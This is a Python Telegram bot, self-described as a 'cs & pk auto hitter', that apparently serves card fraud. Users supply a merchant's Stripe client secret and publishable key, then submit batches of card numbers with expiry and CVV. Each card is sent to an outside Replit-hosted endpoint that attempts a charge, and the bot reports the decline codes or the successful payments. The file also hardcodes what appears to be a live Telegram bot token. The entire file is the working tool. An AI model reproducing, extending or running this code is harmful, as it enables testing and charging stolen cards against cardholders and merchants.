import telebot
import requests
import json

# Replace YOUR_BOT_TOKEN with your actual Telegram bot token
bot = telebot.TeleBot("6770467060:AAEqz8ziNrf3ClXElcT9h3_QY46_z5ExZb8")

# Global variables to store client secret and publishable key
client_secret = None
publishable_key = None

# Function to handle /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to cs & pk auto hitter!\n\nTo set the client secret, use the command: /cs <client_secret>\nTo set the publishable key, use the command: /pk <pk>\nTo process card payments, use the command: /pay <card_details>\n developed by @HRK_07")

# Function to handle /cs command
@bot.message_handler(commands=['cs'])
def set_client_secret(message):
    global client_secret
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Please provide the client secret. Usage: /cs <client_secret>")
        return
    client_secret = parts[1]
    bot.reply_to(message, f"Client secret set to: {client_secret}")

# Function to handle /pk command
@bot.message_handler(commands=['pk'])
def set_publishable_key(message):
    global publishable_key
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Please provide the publishable key. Usage: /pk <publishable_key>")
        return
    publishable_key = parts[1]
    bot.reply_to(message, f"Publishable key set to: {publishable_key}")

# Function to handle /pay command
@bot.message_handler(commands=['pay'])
def process_payments(message):
    global client_secret, publishable_key

    # Check if client secret and publishable key are set
    if not client_secret or not publishable_key:
        bot.reply_to(message, "Please set the client secret and publishable key first using the /cs and /pk commands.")
        return

    # Extract card details from the message
    card_details = message.text.split()[1:]

    # Prepare the base API endpoint URL
    API_BASE_URL = "https://gaystripe.replit.app/stripeinbuilt"

    # Process each card detail
    for card in card_details:
        card_info = card.split("|")
        if len(card_info) != 4:
            bot.reply_to(message, f"Invalid card details format for '{card}'. Skipping this card.")
            continue

        card_number, expiry_month, expiry_year, cvv = card_info

        # Prepare the API request URL
        API_URL = f"{API_BASE_URL}?cc={card_number}|{expiry_month}|{expiry_year}|{cvv}&client_secret={client_secret}&pk={publishable_key}"

        # Make the GET request to the API
        response = requests.get(API_URL)

        # Parse the JSON response
        try:
            response_data = json.loads(response.text)
        except json.JSONDecodeError:
            bot.reply_to(message, f"Card: {card}\n\nInvalid response from the API:\n\n{response.text}")
            continue

        # Extract relevant information from the response
        if "error" in response_data:
            error_data = response_data["error"]
            error_message = error_data.get("message", "Unknown error")
            error_code = error_data.get("code", "")
            error_decline_code = error_data.get("decline_code", "")
            error_doc_url = error_data.get("doc_url", "")
            payment_intent_id = error_data.get("payment_intent", {}).get("id", "")

            reply_message = f"Card: {card}\n\nError: {error_message}\nError Code: {error_code}\nDecline Code: {error_decline_code}\nPayment Intent ID: {payment_intent_id}\nDocumentation URL: {error_doc_url}"
        else:
            payment_intent_id = response_data.get("payment_intent", {}).get("id", "")
            amount = response_data.get("payment_intent", {}).get("amount", 0)
            currency = response_data.get("payment_intent", {}).get("currency", "")
            description = response_data.get("payment_intent", {}).get("description", "")

            reply_message = f"Card: {card}\n\nPayment Successful!\nPayment Intent ID: {payment_intent_id}\nAmount: {amount / 100} {currency}\nDescription: {description}"

        bot.reply_to(message, reply_message)

# Start the bot
bot.polling()
  
